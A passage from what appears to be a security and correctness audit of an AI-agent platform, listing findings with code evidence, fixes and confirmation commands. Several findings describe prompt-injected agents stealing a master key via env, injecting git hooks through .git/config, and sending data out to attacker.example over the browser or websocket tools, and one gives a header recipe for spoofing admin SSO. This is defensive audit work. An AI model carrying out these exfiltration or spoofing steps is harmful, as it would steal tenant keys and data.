- **How to confirm:** grep -rn 'speed\|fast-mode' packages/maverick-core/maverick/providers/ -> no hits; python3 -c "from maverick.providers.anthropic_provider import AnthropicClient; c=AnthropicClient(api_key='x'); print(c._build_request('s',[{'role':'user','content':'hi'}],None,100,None,'claude-opus-4-8-fast')['model'])" prints the literal 'claude-opus-4-8-fast'. Cross-check the model id list in the claude-api skill / GET /v1/models: no such id.

#### W1-1 — Default strict pricing refuses every Azure/Bedrock/openai_compatible/Moonshot/OpenRouter call BEFORE dispatch, even with no budget

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** M · **Found by:** llm-providers
- **Where:** `packages/maverick-core/maverick/llm.py:1437`
- **Evidence:**

  ```
  _est_cost = _estimate_call_cost(_price_spec, system, messages, tools,
                                          max_tokens, thinking_budget=thinking_budget)
          _held = budget.reserve(_est_cost) if budget is not None else 0.0
  ```
- **Why it matters:** _estimate_call_cost is evaluated unconditionally (line 1437, and again at 1574 in complete_async) and it calls budget._lookup_price in billing-grade mode. With the default [budget] strict_pricing=true (budget.py:86-87 'if strict_pricing not in budget: return True'), _lookup_price_quote raises UnpricedModelError (budget.py:346-353) for any model id without a *verified* rate-card row. Verified by scratch run: 'azure:gpt-4o-prod', 'bedrock:anthropic.claude-sonnet-4-20250514-v1:0', 'openai_compatible:llama-3.3-70b-versatile', 'moonshot:kimi-k2', 'gemini:gemini-3.5-pro', 'openrouter:meta-llama/llama-3.3-70b', 'xai:grok-code-fast', 'deepseek:deepseek-chat', 'anthropic:claude-opus-5', 'anthropic:claude-sonnet-5' ALL raise before the request is sent, and the raise happens even when budget=None. The shipped evidence pack marks every Moonshot, every OpenRouter, deepseek-chat/reasoner, gemini-3.5-pro/3-*, and four xAI rows verified=false, and Azure deployments / Bedrock model ids / generic gateways can never be in the table. So in the DEFAULT configuration 5 of the '13 providers, routable per role' claimed in docs/FEATURES.md:2565 cannot complete a single call, and the dashboard MODEL_CATALOG (llm.py:330-334) offers pickers for models (deepseek-chat, kimi-k2, gemini-3.5-pro, minimax/…) that fail at the first turn with a budget error. The only escape is the wizard's 'Strict pricing?' toggle (wizard.py:1052) which the prompt itself recommends leaving on.
- **Recommendation:** Separate the pre-dispatch *estimate* from the post-response *bill*: call _estimate_call_cost with estimate_only=True (it is a hold/projection, not an invoice) and only require a verified rate in Budget.record_tokens. For providers whose ids are structurally unpriceable (azure deployment names, bedrock, openai_compatible) add a per-provider `[providers.<name>] price_in/price_out` knob that produces a verified-by-operator ModelPrice, and surface the strict-pricing refusal in `maverick doctor` / the model picker instead of at call time. Remove unverified models from MODEL_CATALOG or badge them 'estimate-only'.
- **Prior report:** CODE_QUALITY_AUDIT.md llm.py:108-115 (OpenRouter placeholder rates) is adjacent but reported the rates, not the pre-dispatch refusal
- **How to confirm:** HOME=/tmp/x python3 -c "from maverick.llm import _estimate_call_cost; _estimate_call_cost('azure:gpt-4o-prod','s',[{'role':'user','content':'hi'}],None,100)" -> UnpricedModelError with no budget involved. Then `python3 -c "import json,importlib.resources as r; [print(e['evidence_id'],e['verified']) for e in json.loads(r.files('maverick').joinpath('data/pricing-rate-card-2026-07-29.json').read_text())['entries']]"` shows moonshot/openrouter/gemini-pro/xai-alias/deepseek-alias rows are verified=false.

#### W2-45 — MAVERICK_KMS_KEK (tenant DEK wrapping key) is not scrubbed from the sandbox shell environment

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** S · **Found by:** crypto-secrets
- **Where:** `packages/maverick-core/maverick/sandbox/local.py:22`
- **Evidence:**

  ```
  _SECRET_ENV_RE = re.compile(
      r"(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|PASSPHRASE|CREDENTIAL|APIKEY|DSN|URI|URL|CONN"
      r"|OAUTH|BEARER|HEADER|NETRC|COOKIE|AUTH)",
  ```
- **Why it matters:** scrub_env() is the only thing keeping host secrets out of model-driven shell commands on the default LocalBackend (its own docstring: a prompt-injected agent can `printenv`). The name MAVERICK_KMS_KEK (tenant/kms.py:120 `raw = os.environ.get("MAVERICK_KMS_KEK")`) contains none of the pattern words ('KEK' != 'KEY'), so `scrub_env({"MAVERICK_KMS_KEK": "x"})` returns it unchanged (verified). That KEK wraps EVERY tenant's DEK: an injected agent running `env` in the sandbox exfiltrates the master key of the per-tenant envelope-encryption scheme through the model context. Reachable whenever an operator sets MAVERICK_KMS_KEK (the documented way to inject a KEK, docs/env-vars.md:135) and uses the default local sandbox.
- **Recommendation:** Add `KEK` (and `SALT`, `SEED`, `SIGNING`) to _SECRET_ENV_RE, and add MAVERICK_KMS_KEK / MAVERICK_ENCRYPTION_KEY / MAVERICK_AUDIT_SIGNING_KEY_WRAPPED to _ALWAYS_STRIP_ENV as explicit records; add a test that every secret-bearing env name in docs/env-vars.md is stripped by scrub_env.
- **Spot-check:** Hand re-read: sandbox/local.py _SECRET_ENV_RE alternatives (KEY|TOKEN|SECRET|...|AUTH) do not match the string MAVERICK_KMS_KEK, and it is not in _ALWAYS_STRIP_ENV.
- **How to confirm:** python3 -c "from maverick.sandbox.local import scrub_env; print('MAVERICK_KMS_KEK' in scrub_env({'MAVERICK_KMS_KEK':'x'}))" prints True. Scratch: scratchpad/audit/work/crypto-secrets (scrub scan).

#### W2-69 — Per-tenant egress plane is consulted by exactly one of 73 network tools; docstring claims it applies to every tool

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** M · **Found by:** tenant-isolation
- **Where:** `packages/maverick-core/maverick/tenant/egress.py:4`
- **Evidence:**

  ```
  :mod:`maverick.sandbox.network_policy` restricts egress **per tool**. This adds a
  plane **per tenant** that applies to *every* tool a tenant's agents run, so one
  tenant can't reach another tenant's resources or a cloud metadata endpoint
  regardless of which tool makes the call.
  ```
- **Why it matters:** `egress_allowed`/`host_allowed` from tenant.egress are imported in exactly one production module: tools/http_fetch.py:391. 73 modules under tools/ make outbound HTTP (gmail_tool, msgraph_tool, hubspot_tool, bigquery_tool, github_*, gitlab, jira, ...) and none consult the tenant plane. The process-wide egress_guard.py wrapper -- which the repo's own docstring (egress_guard.py:3-18) introduced precisely because 'the per-tool design could not have worked' -- consults enterprise.egress_permitted only, not tenant.egress. So `[tenancy.egress.acme] deny = ["*"]` or the documented `[egress] deny = ["169.254.169.254"]` metadata block is enforced only for the generic http_fetch tool; every connector tool reaches any host. A customer configuring a tenant allowlist gets a decorative control -- the exact 'documented capability is inert' class the prior audit flagged in other subsystems.
- **Recommendation:** Hook the tenant plane into egress_guard's one-request seam (call tenant.egress.host_allowed(host) alongside egress_permitted for the active tenant via current_tenant_id()), or delete the 'every tool' claim and document it as http_fetch-only. Add an egress_contract-style CI assertion that the wrapped seam consults tenant.egress. Until then, remove the claim from the docstring and docs/multi-tenancy.md.
- **How to confirm:** grep -rn 'egress_allowed\|tenant.egress' packages --include=*.py | grep -v tests -> only tools/http_fetch.py:391. grep -c 'httpx\.\|urllib.request' across tools/*.py -> 73 files. grep -n 'tenant' packages/maverick-core/maverick/egress_guard.py -> only the docstring mention of network_policy.

#### W2-3 — write_file allows writing under .git/ outside benchmark opaque mode (enables git-config hook injection)

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** S · **Found by:** injection-sweep
- **Where:** `packages/maverick-core/maverick/tools/fs.py:199`
- **Evidence:**

  ```
  def _is_opaque_blocked(rel_path: str) -> bool:
      opaque = _os.environ.get("MAVERICK_BENCHMARK_OPAQUE", "1") != "0"
      coding = _os.environ.get("MAVERICK_CODING_MODE", "").lower() in ("1","true","yes")
      if not (opaque and coding):
          return False
      return _is_test_path(rel_path) or _is_dotgit_path(rel_path)
  ```
- **Why it matters:** The `.git/` write block is gated behind BOTH opaque benchmark mode AND coding mode. In ordinary agent operation (neither env set) write_file happily writes `.git/config`, `.git/info/attributes`, or `.gitattributes` — the exact files git reads to decide which external commands to run (fsmonitor, clean/smudge filters, diff/pager helpers). I confirmed write_file(sb).fn({"path": ".git/config", ...}) succeeded on a LocalBackend workdir. Combined with finding #1 (unguarded host git diff), a prompt-injected agent turns a file write into host command execution. The `.git` directory should never be writable through the agent file tool regardless of mode; the benchmark-only rationale (gold-answer leakage) is narrower than the real threat.
- **Recommendation:** In _safe_resolve / write_text_contained, unconditionally refuse any resolved path containing a `.git` segment for WRITES (keep the opaque-mode read block as-is). This closes the config-injection path even if a host git call is missed.
- **Spot-check:** Finder proved write_file can write .git/config in non-opaque mode; consistent with the host-git chain in W2-1/W2-2. Not re-executed at close-out.
- **How to confirm:** With no MAVERICK_* env set: python3 -c 'from maverick.sandbox.local import LocalBackend; from maverick.tools.fs import write_file; from pathlib import Path; print(write_file(LocalBackend(workdir=Path("<git repo>"))).fn({"path":".git/config","content":"x"}))' — returns 'wrote ... bytes'.

#### W2-88 — browser tool (Playwright) is outside both the process-wide egress guard and the enterprise/tenant egress checks

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** M · **Found by:** network-egress
- **Where:** `packages/maverick-core/maverick/tools/browser.py:342`
- **Evidence:**

  ```
  if not _is_safe_browser_url(url):
          return (
              "ERROR: URL must be http(s) and must not target localhost or "
              f"non-public IP ranges; got {url!r}"
          )
      log.info("browser.navigate %s", url)
      page.goto(url, timeout=timeout, wait_until="domcontentloaded")
  ```
- **Why it matters:** Chromium issues its own network requests, so egress_guard's httpx/requests/urllib seams never see them, and _browser_navigate consults only the SSRF private-IP predicate and the optional capability allow_hosts (grep: no 'enterprise' or 'egress' anywhere in browser.py). With enterprise mode or a HIPAA-style compliance floor on, navigate to https://attacker.example/?q=<data> exfiltrates whatever the agent knows, exactly the property the lock exists to deny. Reachability: browser() is registered only when enable_browser is true (tools/__init__.py:1470-1472) and Playwright is installed, but that is a common configuration for the 'browse the web' packs and nothing in enterprise mode disables it.
- **Recommendation:** Gate _browser_navigate/_browser_go_back/_browser_go_forward/click on enterprise.enterprise_egress_denial(url, tool='browser') and tenant.egress.egress_allowed('browser', host); additionally register a Playwright page.route('**/*') handler that aborts any request whose host fails egress_permitted/is_blocked_host (this also fixes the post-hoc redirect problem in the next finding). Document the browser as outside the HTTP seam in egress_guard's module docstring and enterprise.py's 'what it still does not cover' list.
- **How to confirm:** grep -n -E 'enterprise|egress|route\(' packages/maverick-core/maverick/tools/browser.py returns nothing for enterprise/egress/route. Compare with tools/http_fetch.py:379-382 which calls enterprise_egress_denial before any network activity.

#### W2-94 — guarded_urlopen breaks behind any HTTP(S) proxy on a private/loopback address: the pinned connection refuses the proxy host (reproduced on this box)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** S · **Found by:** network-egress
- **Where:** `packages/maverick-core/maverick/tools/http_fetch.py:321`
- **Evidence:**

  ```
  opener = urllib.request.build_opener(
          _PinnedHTTPHandler,
          _PinnedHTTPSHandler,
          _RevalidatingRedirectHandler(allow_http=allow_http),
      )
      return opener.open(url_or_req, timeout=timeout)
  ```
- **Why it matters:** build_opener adds the default ProxyHandler (reads HTTP_PROXY/HTTPS_PROXY). When a proxy is set, urllib rewrites req.host to the proxy and the pinned connection's connect() runs _resolve_pinned(self.host) (line 264) on the PROXY address; a corporate proxy is almost always on 10.x/192.168.x/127.0.0.1, so it raises 'resolves to blocked address'. Live result here with HTTPS_PROXY=http://127.0.0.1:33825: guarded_urlopen('https://example.com/') -> ValueError "refusing to fetch '127.0.0.1': resolves to blocked address 127.0.0.1 (SSRF guard)" while plain httpx.get succeeds. Every guarded_urlopen caller is dead in that environment: web_archive tool, catalog index (templates/marketplace/mcp_registry), skill install, policy_packs fetch, oidc_tool token exchange, finance/regulatory_change feeds, self_learning doc discovery. The only escape is MAVERICK_FETCH_ALLOW_PRIVATE=1, which disables SSRF protection process-wide.
- **Recommendation:** In _make_pinned_connect, detect proxied requests (self._tunnel_host is set, or req.host != urlparse(req.full_url).hostname) and skip pinning of the proxy hop (the target was already validated by _check_url_allowed; the proxy is operator-trusted), or explicitly pass ProxyHandler({}) to disable proxies for this opener and document that guarded fetches ignore proxies (matching safe_client). Add a regression test that sets HTTPS_PROXY to a 127.0.0.1 address and asserts guarded_urlopen does not raise BlockedHost-style errors.
- **How to confirm:** HTTPS_PROXY=http://127.0.0.1:3128 python3 -c "import maverick; from maverick.tools.http_fetch import guarded_urlopen; guarded_urlopen('https://example.com/', timeout=5)" -> ValueError mentioning 127.0.0.1 before any connection is attempted.

#### W2-87 — websocket tool bypasses the enterprise tool-egress lock entirely (websockets library is not wrapped, no enterprise_egress_denial call)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** network-egress
- **Where:** `packages/maverick-core/maverick/tools/websocket_tool.py:85`
- **Evidence:**

  ```
  try:
          async with websockets.connect(url, **connect_kwargs) as ws:
              if message is not None:
                  await ws.send(str(message))
  ```
- **Why it matters:** enterprise.py sells the 'Tool egress lock' (outbound held to local/allow-listed hosts on supported paths) and egress_guard wraps httpx/httpx2/requests/urllib only. websocket_tool is registered by default (tools/__init__.py:1325), takes a model-supplied ws(s):// URL, runs only the SSRF private-IP check (_check_url, lines 31-44) and never imports enterprise or tenant.egress. In enterprise/compliance-floor mode a prompt-injected agent can open wss://attacker.example and push any data it holds, and no EGRESS_BLOCKED audit event is written. The egress_contract census (which is supposed to record such holes) does not list websockets.connect in _HTTP_CALLS, so this gap is invisible to CI.
- **Recommendation:** In _run(), before resolve_pinned_ip, call enterprise.enterprise_egress_denial(url.replace('ws','http',1), tool='websocket') and tenant.egress.egress_allowed('websocket', host) and return the ERROR string on denial; add 'websockets.connect' to egress_contract._HTTP_CALLS mapped to a library that is NOT in COVERED_LIBRARIES so the module is recorded in KNOWN_UNCOVERED; add a test in test_enterprise_tool_egress.py that enables enterprise mode and asserts the websocket tool refuses a public host.
- **How to confirm:** grep -n 'enterprise' packages/maverick-core/maverick/tools/websocket_tool.py (no hits); then MAVERICK_ENTERPRISE=1 python3 -c "import asyncio,maverick; from maverick.tools import websocket_tool as w; print(asyncio.run(w._run({'url':'wss://echo.websocket.org'})))" — it attempts the connection (or reports websockets missing) instead of an enterprise egress refusal, whereas http_fetch returns 'ERROR: enterprise mode: refusing tool egress'.

#### W1-52 — Per-thread SQLite reader connections are retained for the life of the WorldModel: short-lived threads leak a connection and two FDs each

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** S · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/world_model.py:1213`
- **Evidence:**

  ```
  conn = sqlite3.connect(self.path, check_same_thread=False,
                                     timeout=10.0, isolation_level=None)
              conn.row_factory = sqlite3.Row
              conn.execute(f"PRAGMA busy_timeout = {DEFAULT_BUSY_TIMEOUT_MS}")
              self._readers.conn = conn
              with self._reader_conns_lock:
                  self._reader_conns.append(conn)
  ```
- **Why it matters:** _reader() creates one connection per thread and appends it to a strong list that is only drained in close(). The dashboard's WorldModel is process-cached for the life of the server (world_for_tenant), FastAPI/Starlette sync endpoints and template work run on anyio worker threads that EXIT after 10 s idle (anyio 4.15.1 `MAX_IDLE_TIME = 10`), app.py:623 and worker.py:327 spawn ad-hoc threads, so every new thread that touches the world permanently retains a connection (+ the WAL/SHM fds). Measured: 300 short-lived threads -> 300 retained connections, +600 open FDs, none reclaimed after gc. On a long-running dashboard with bursty traffic this walks toward EMFILE / 'unable to open database file'.
- **Recommendation:** Track reader connections with weakref/finalizers keyed on thread liveness: store them in a dict keyed by thread ident and prune entries whose thread is no longer alive on each _reader() call (or use a small bounded pool of reader connections handed out under a lock instead of thread-locals). Add a regression test that spawns N short-lived threads and asserts len(_reader_conns) stays bounded.
- **How to confirm:** python3 - <<'EOF'
import tempfile,threading,os; from pathlib import Path; from maverick.world_model import WorldModel
w=WorldModel(Path(tempfile.mkdtemp())/'w.db'); g=w.create_goal('t','d'); b=len(os.listdir('/proc/self/fd'))
for _ in range(300):
    t=threading.Thread(target=lambda: w.get_goal(g)); t.start(); t.join()
print(len(w._reader_conns), len(os.listdir('/proc/self/fd'))-b)
EOF
-> 300 600. Confirm anyio idle exit: grep MAX_IDLE_TIME in anyio/_backends/_asyncio.py.

#### W1-46 — Postgres search_goals ignores the owner filter: non-admin dashboard search returns every user's goals on the HA backend

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** S · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/world_model_backends/postgres.py:1588`
- **Evidence:**

  ```
  ``owner`` is accepted for signature parity but not used -- PG isolates by
          tenant, applied below.
  ```
- **Why it matters:** The dashboard's GET /api/v1/goals/search (api.py:1533: `_world().search_goals(query, owner=goal_owner_filter(request), limit=limit)`) documents itself as 'Owner-scoped: a non-admin authenticated caller searches only their own goals'. On SQLite that holds (world_model.py search_goals adds `WHERE owner = ?`). On the documented enterprise backend the owner predicate is silently dropped, so any authenticated non-admin user can read other principals' decrypted goal titles/descriptions/results by searching for common words. Tenant scoping does not help inside a single tenant, which is the recommended 'one instance per customer' deployment. This is the same backend split-brain class CODE_QUALITY_AUDIT flagged for retitle/reparent (now fixed) but on an authorization boundary.
- **Recommendation:** Add `owner = %s` to both the sealed scan-then-decrypt branch and the ILIKE branch of PostgresWorldModel.search_goals when owner is not None (mirror list_goals which already does), and add a Postgres-marked test that a second owner's goal is not returned.
- **Spot-check:** Hand re-read: postgres.py search_goals docstring says `owner` is accepted for signature parity but not used and that PG isolates by tenant. Tenant isolation holds; per-user (owner) scoping within a tenant does not, which is what the dashboard relies on for non-admin users.
- **How to confirm:** Read postgres.py:1582-1640: no `owner` predicate is ever added to `sql`. Compare world_model.py:2048-2083 which appends `WHERE owner = ?`. With a live PG: create goals for owners a and b, set MAVERICK_WORLD_BACKEND=postgres, call search_goals('goal', owner='a') and observe b's goal in the result.

#### W1-48 — PostgresWorldModel.total_spend takes no owner argument: /api/v1/spend and external-agent records 500 on Postgres

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** correctness · **Effort:** S · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/world_model_backends/postgres.py:2619`
- **Evidence:**

  ```
  def total_spend(self) -> dict[str, float]:
          frag, params = _tenant_scope("g.tenant_id")
  ```
- **Why it matters:** SQLite total_spend(owner=None) exists precisely so /api/v1/spend scopes spend to the caller (api.py:8051 `total = w.total_spend(owner=owner)`) and external_agents.py:2108 `w.total_spend(owner=principal)`. On Postgres both raise `TypeError: total_spend() got an unexpected keyword argument 'owner'`, so the spend page/API 500s for every caller and the external-agent roster record breaks. list_episodes was ported with owner support; total_spend was not.
- **Recommendation:** Add `owner: str | None = None` to PostgresWorldModel.total_spend and add `AND g.owner = %s` (join goals already happens when a tenant is active; always join when owner is given). Cover with a parity test.
- **Spot-check:** Hand re-read: world_model.WorldModel.total_spend(self, owner=None) vs PostgresWorldModel.total_spend(self) — any owner-scoped caller raises TypeError on the PG backend.
- **How to confirm:** grep -n 'total_spend(owner' packages/maverick-dashboard/maverick_dashboard/api.py packages/maverick-core/maverick/external_agents.py; inspect.signature(PostgresWorldModel.total_spend) shows only (self).

#### W1-47 — PostgresWorldModel.create_goal has no domain/project_id kwargs: checkpoint sub-goal spawning and the finance CLI raise TypeError on Postgres

- **Severity:** high · **Status:** Plausible (hand spot-check; see note) · **Category:** correctness · **Effort:** S · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/world_model_backends/postgres.py:1352`
- **Evidence:**

  ```
  def create_goal(
          self,
          title: str,
          description: str = "",
          parent_id: int | None = None,
          *,
          owner: str = "",
          execution_principal: str = "",
  ```
- **Why it matters:** SQLite WorldModel.create_goal accepts `domain=` and `project_id=` (world_model.py:1508). Live callers pass them: checkpoint.py:418 `world.create_goal(title, desc, parent_id=goal_id, domain=domain)` (the checkpoint/resume path that spawns follow-on goals) and cli/_finance_groups.py:394/400 `world.create_goal(title, domain="finance_sox")`. Under `[world_model] backend = "postgres"` these raise `TypeError: create_goal() got an unexpected keyword argument 'domain'`. PGGoal also lacks the domain/project_id fields, so department attribution for learning loops is lost on PG even where set_goal_domain is called afterwards.
- **Recommendation:** Add `domain: str = ""` and `project_id: int | None = None` to PostgresWorldModel.create_goal (the columns already exist via migrations v14/v15) and write them in the INSERT; add domain/project_id to PGGoal and _dec_goal_row. Add a signature-parity test (inspect.signature over the shared public surface) so the two backends cannot drift again.
- **Spot-check:** Hand re-read confirmed the SQLite create_goal signature carries domain= and project_id=; the PG signature was only partially re-read (through `owner`). The finder's inspect-based signature diff is the evidence.
- **How to confirm:** python3 -c "import inspect; from maverick.world_model import WorldModel as S; from maverick.world_model_backends.postgres import PostgresWorldModel as P; print(inspect.signature(S.create_goal)); print(inspect.signature(P.create_goal))" then grep -n 'domain=' packages/maverick-core/maverick/checkpoint.py packages/maverick-core/maverick/cli/_finance_groups.py.

#### W2-68 — Postgres RLS never checks the connection role for SUPERUSER/BYPASSRLS, so 'fail-closed' isolation is silently void under a privileged DSN

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** tenant-isolation
- **Where:** `packages/maverick-core/maverick/world_model_backends/postgres.py:1262`
- **Evidence:**

  ```
  for table in _RLS_TABLES:
              try:
                  with self._tx() as cur:
                      cur.execute(f"ALTER TABLE {table} ENABLE ROW LEVEL SECURITY")
                      cur.execute(f"ALTER TABLE {table} FORCE ROW LEVEL SECURITY")
                      cur.execute(f"DROP POLICY IF EXISTS mvk_tenant_isolation ON {table}")
  ```
- **Why it matters:** Postgres row-level security (even FORCE RLS) does not apply to superusers or roles with BYPASSRLS. _apply_rls installs the policy, _rls_policy_is_active reports it 'active', and pg_rls.preflight (pg_rls.py:96 `owned = owner == role`) only checks ownership -- nothing anywhere in the world-model path checks pg_roles.rolsuper/rolbypassrls. governed_records.py:788 DOES run `SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname=current_user` and returns 'incompatible', proving the codebase knows the hazard but the tenant world model does not apply it. deploy/postgres/README.md:57 promises 'the DB refuses cross-tenant reads/writes even if application code has a bug' and docs/ROADMAP.md:65 itself lists 'operator runbook guidance (connect as a non-superuser role)' as remaining. A deployment whose MAVERICK_PG_DSN uses the default `postgres` superuser (very common in docker/self-hosted setups) gets NO database-enforced isolation while every log/preflight says RLS is on; the app-layer predicate then becomes the only boundary, and in non-strict mode it also exposes legacy NULL rows.
- **Recommendation:** In PostgresWorldModel.__init__ when self._rls is true (and in pg_rls.preflight), run `SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname = current_user` and raise RuntimeError('RLS cannot be enforced for a SUPERUSER/BYPASSRLS role') -- mirror governed_records._schema_status_on. Report it as a `ready=False` reason in `maverick tenant rls-preflight`. Add `NOSUPERUSER NOBYPASSRLS` to the CREATE ROLE snippet in deploy/postgres/README.md and a doctor check.
- **How to confirm:** grep -n 'rolsuper\|rolbypassrls' packages/maverick-core/maverick/world_model_backends/*.py -> no hits; compare governed_records.py:786-791. With a real PG: `MAVERICK_PG_DSN=postgres://postgres@... MAVERICK_PG_RLS=1` -> boot succeeds, `_rls_policy_is_active` true, yet `set_tenant('a')` reads tenant 'b' rows when the app predicate is bypassed (e.g. WorldModel.query raw SQL).

#### W1-69 — 469 of 1,894 dashboard async route handlers never await and run synchronous SQLite/world work directly on the event loop

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** concurrency · **Effort:** M · **Found by:** concurrency-reliability
- **Where:** `packages/maverick-dashboard/maverick_dashboard/api.py:1485`
- **Evidence:**

  ```
  async def list_goals(
      request: Request,
      ...
      w = _world()
      limit = max(1, min(int(limit or 50), 500))
      offset = max(0, int(offset or 0))
      goals = w.list_goals(
  ```
- **Why it matters:** FastAPI runs `async def` handlers inline on the single event-loop thread; only plain `def` handlers are threadpooled. An AST census of every route-decorated async def in maverick_dashboard finds 469 with zero await/async-with/async-for whose bodies call _world()/store helpers (examples: api.py:1485 list_goals, 1538 get_goal `g = _world().get_goal(goal_id)`, 1319 create_goal, 5167-5230 facts/outcomes, plus the pre-generator `w.get_goal` in goal_events_stream at 1618). Each such call holds the loop for the duration of the SQLite I/O; a writer holding the WAL lock (busy_timeout up to 10s in WorldModel) freezes every concurrent request, SSE stream heartbeat and even /healthz (its run_in_threadpool result cannot be delivered while the loop is blocked). This is the default configuration and the most common request path.
- **Recommendation:** Mechanically convert zero-await route handlers to plain `def` (FastAPI will threadpool them) or wrap world/store calls in run_in_threadpool; add a CI gate in the style of the existing custom gates (a2a/a11y) that fails on a route-decorated `async def` with no await whose body calls _world()/sqlite. The scan script at scratch/audit/work/concurrency-reliability/scan_async_routes.py can seed the gate.
- **How to confirm:** python3 /tmp/claude-0/-home-user-Lightwork/077d0601-5e34-50a4-85b5-07b88142b155/scratchpad/audit/work/concurrency-reliability/scan_async_routes.py 2>&1 | head -3 ; then read api.py:1485-1504 and 1538-1540 and confirm no await.

#### W2-8 — Reverse-proxy SSO identity can be spoofed by any loopback peer via X-Forwarded-For under uvicorn's default proxy-header handling

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** dashboard-auth
- **Where:** `packages/maverick-core/maverick/proxy_auth.py:86`
- **Evidence:**

  ```
  trusted = _section().get("trusted_proxies")
      if isinstance(trusted, (list, tuple)) and trusted:
          return client_host in {str(t).strip() for t in trusted}
      return _trust_loopback_fallback() and client_host in _LOOPBACK
  ```
- **Why it matters:** proxy_trusts() decides whether to honor X-Forwarded-User from request.client.host, but the dashboard is launched with uvicorn.run(app, host=..., port=...) (app.py:10486, cli/__init__.py:2891) which keeps uvicorn defaults proxy_headers=True / forwarded_allow_ips=127.0.0.1. uvicorn's ProxyHeadersMiddleware therefore REWRITES scope['client'] from X-Forwarded-For for any loopback peer before the app sees it. With [auth.proxy] trusted_proxies=["10.0.0.5"] (a remote pinned proxy, the secure form the docstring recommends), a co-located loopback process, sidecar, or an SSRF pivot to 127.0.0.1 sends 'X-Forwarded-For: 10.0.0.5' + 'X-Forwarded-User: admin' and is authenticated as user:admin. Proven: raw app 401, uvicorn-wrapped app 200 (scratch proof3.py). This re-opens exactly the co-located-loopback spoof that the trust_loopback=false default (ADVERSARY_COUNCIL #11 remediation) was meant to close, and the TestClient-based tests never exercise uvicorn's middleware so it is invisible to the suite. Preconditions: proxy auth enabled with a pinned non-loopback proxy and loopback reachability — modest in container/pod deployments.
- **Recommendation:** Make the transport peer authoritative for proxy_trusts: launch uvicorn with proxy_headers=False (or forwarded_allow_ips=[] ) whenever [auth.proxy] is enabled, or have proxy_trusts read the raw socket peer (e.g. keep it on scope['server']/transport before uvicorn rewrites, or set forwarded_allow_ips from trusted_proxies so only the pinned proxy may assert XFF). Add an ASGI-level regression test that wraps app in uvicorn.middleware.proxy_headers.ProxyHeadersMiddleware(trusted_hosts='127.0.0.1') and asserts a loopback peer with X-Forwarded-For=<pinned> is refused. Document FORWARDED_ALLOW_IPS in docs/security-hardening.md.
- **Prior report:** ADVERSARY_COUNCIL_REVIEW.md #11 covered the loopback-trust default, not this uvicorn XFF rewrite
- **How to confirm:** python3 /tmp/claude-0/-home-user-Lightwork/077d0601-5e34-50a4-85b5-07b88142b155/scratchpad/audit/work/dashboard-auth/proof3.py 10.0.0.5  -> '[uvicorn-default] ... xfu+xff=10.0.0.5:200' while '[raw-app] ... :401'. Also: python3 -c "import inspect,uvicorn.config as c;print('proxy_headers: bool = True' in inspect.getsource(c.Config.__init__))"

#### W3-18 — In-app feature switches for fleet_memory and entity_graph never persist: settings_store._dump allowlist silently drops both sections and the API returns a misleading 409

- **Severity:** high · **Status:** Plausible (hand spot-check; see note) · **Category:** correctness · **Effort:** S · **Found by:** dashboard-core-api
- **Where:** `packages/maverick-dashboard/maverick_dashboard/settings_store.py:441`
- **Evidence:**

  ```
  for section in dict.fromkeys((
                      "capabilities", "features", "flows", "self_modify", "ekko",
                      "security_ops", "threat_hunt", "env_hunt",
                      "security_suite_control",
                      *_LEARNING_SECTIONS, *_MODULE_TOP_SECTIONS)):
          tbl = data.get(section) or {}
  ```
- **Why it matters:** SWITCHABLE_SECTIONS (settings_store.py:838) lists nine sections that set_section_enable() (line 844) may write, but _dump's allowlist omits 'fleet_memory' and 'entity_graph' (neither is in _LEARNING_SECTIONS nor _MODULE_TOP_SECTIONS), so _write() serialises the overlay without them. POST /api/v1/features/switches (api.py:10718) then re-reads live state, sees no change, writes again (also dropped) and raises 409 'fleet_memory is controlled by a higher-precedence environment, entitlement, or policy source' — an operator is told a policy blocks them when the platform simply lost the write. Verified: set_section_enable('fleet_memory', True) and ('entity_graph', True) leave the overlay file without those tables; via HTTP, enabling fleet_memory returns 409 and disabling entity_graph (default on) returns 409. The two switches are advertised in _FEATURE_SWITCHES (api.py:10619) with labels 'Fleet memory' and 'Entity graph', so the in-app control for two selling-point subsystems is dead in the default configuration.
- **Recommendation:** Add 'fleet_memory' and 'entity_graph' (and generally every entry of SWITCHABLE_SECTIONS) to the _dump section list — e.g. `for section in dict.fromkeys((..., *SWITCHABLE_SECTIONS, *_LEARNING_SECTIONS, *_MODULE_TOP_SECTIONS))` — and add a parametrized round-trip test over SWITCHABLE_SECTIONS asserting load_overlay()[section]['enable'] after set_section_enable(). Consider making _dump fail loudly (log.error or raise) when a top-level key it does not know how to serialise is present instead of dropping it.
- **Spot-check:** Hand re-read: SWITCHABLE_SECTIONS names fleet_memory and entity_graph, and _dump's explicit section list does not; whether they survive depends on _LEARNING_SECTIONS membership. The finder's round-trip test over every SWITCHABLE_SECTIONS entry showed both dropped.
- **How to confirm:** python3 - <<'EOF'
